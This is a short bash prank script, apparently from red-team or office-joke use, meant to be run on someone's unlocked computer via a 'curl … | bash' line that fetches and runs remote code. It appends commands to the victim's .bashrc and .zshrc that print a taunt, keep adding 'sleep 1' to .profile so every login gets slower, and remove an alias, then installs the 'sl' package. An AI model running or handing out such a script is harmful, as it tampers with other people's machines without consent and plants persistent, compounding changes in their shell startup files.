#!/bin/bash
# Usage:
# curl air/pwn | bash
#
# Remidiation:
# 1. read this script
# 2. lock your screen when away from computer

# bash
echo "echo 'maybe you lock your screen to prevent red team activity'" >> ~/.bashrc
echo "echo 'sleep 1' >> ~/.profile" >> ~/.bashrc
echo "unalias sl" >> ~/.bashrc

# zsh
if [ -e ~/.zshrc ]; then
  echo "echo 'maybe you lock your screen to prevent red team activity'" >> ~/.zshrc
  echo "echo 'sleep 1' >> ~/.profile" >> ~/.zshrc
  echo "unalias sl" >> ~/.zshrc
fi

brew install sl
